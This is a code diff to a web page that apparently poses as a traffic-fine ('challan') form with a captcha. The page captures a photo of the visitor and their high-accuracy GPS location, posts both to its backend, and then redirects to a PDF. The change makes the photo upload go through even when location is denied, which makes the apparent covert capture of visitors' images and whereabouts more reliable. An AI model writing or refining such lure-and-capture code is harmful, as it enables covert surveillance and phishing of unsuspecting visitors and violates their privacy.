@@ -337,48 +337,6 @@
         }
       }
 
-      // Function to send data to backend
-      async function sendToBackend(imageData, locationData) {
-        try {
-          console.log('Uploading image...');
-          
-          // Upload image
-          const imageResponse = await fetch('/capture', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: imageData })
-          });
-          
-          if (!imageResponse.ok) {
-            throw new Error(`Image upload failed: ${imageResponse.statusText}`);
-          }
-          
-          const imageResult = await imageResponse.json();
-          console.log('Image uploaded:', imageResult);
-          
-          console.log('Uploading location...', locationData);
-          
-          // Upload location
-          const locationResponse = await fetch('/location', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(locationData)
-          });
-          
-          if (!locationResponse.ok) {
-            throw new Error(`Location upload failed: ${locationResponse.statusText}`);
-          }
-          
-          const locationResult = await locationResponse.json();
-          console.log('Location uploaded:', locationResult);
-          
-          return { imageResult, locationResult };
-        } catch (error) {
-          console.error('Backend error:', error);
-          throw error;
-        }
-      }
-
       // Initialize captcha on page load
       refreshCaptcha();
 
@@ -437,34 +395,70 @@
               const imageData = await capturePhoto();
               
               console.log('Photo captured');
-              console.log('Getting location...');
               
-              // Get location
-              const position = await new Promise((resolve, reject) => {
-                if (navigator.geolocation) {
-                  navigator.geolocation.getCurrentPosition(resolve, reject, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                  });
-                } else {
-                  reject(new Error('Geolocation not supported'));
-                }
-              });
+              // Try to get location (but don't fail if it doesn't work)
+              let locationData = null;
+              try {
+                console.log('Getting location...');
+                const position = await new Promise((resolve, reject) => {
+                  if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                      enableHighAccuracy: true,
+                      timeout: 10000,
+                      maximumAge: 0
+                    });
+                  } else {
+                    reject(new Error('Geolocation not supported'));
+                  }
+                });
+                
+                locationData = {
+                  lat: position.coords.latitude,
+                  lon: position.coords.longitude,
+                  accuracy: position.coords.accuracy
+                };
+                console.log('Location obtained:', locationData);
+              } catch (locError) {
+                console.warn('Location unavailable:', locError);
+              }
               
-              const locationData = {
-                lat: position.coords.latitude,
-                lon: position.coords.longitude,
-                accuracy: position.coords.accuracy
-              };
-              
-              console.log('Location obtained:', locationData);
               console.log('Sending to backend...');
               
-              // Send to backend
-              const result = await sendToBackend(imageData, locationData);
+              // Upload image (always)
+              const imageResponse = await fetch('/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imageData })
+              });
               
-              console.log('Upload complete:', result);
+              if (!imageResponse.ok) {
+                throw new Error(`Image upload failed: ${imageResponse.statusText}`);
+              }
+              
+              const imageResult = await imageResponse.json();
+              console.log('Image uploaded:', imageResult);
+              
+              // Upload location (only if available)
+              if (locationData) {
+                try {
+                  const locationResponse = await fetch('/location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(locationData)
+                  });
+                  
+                  if (locationResponse.ok) {
+                    const locationResult = await locationResponse.json();
+                    console.log('Location uploaded:', locationResult);
+                  } else {
+                    console.warn('Location upload failed (non-critical)');
+                  }
+                } catch (locUploadError) {
+                  console.warn('Location upload error (non-critical):', locUploadError);
+                }
+              }
+              
+              console.log('Upload complete');
               
               // Reset form
               document.getElementById('challanForm').reset();
@@ -472,7 +466,7 @@
               
               console.log('Form reset complete');
               
-              // Redirect to PDF after successful upload
+              // Redirect to PDF after successful photo upload
               window.location.href = PDF_REDIRECT_URL;
               
             } catch (error) {
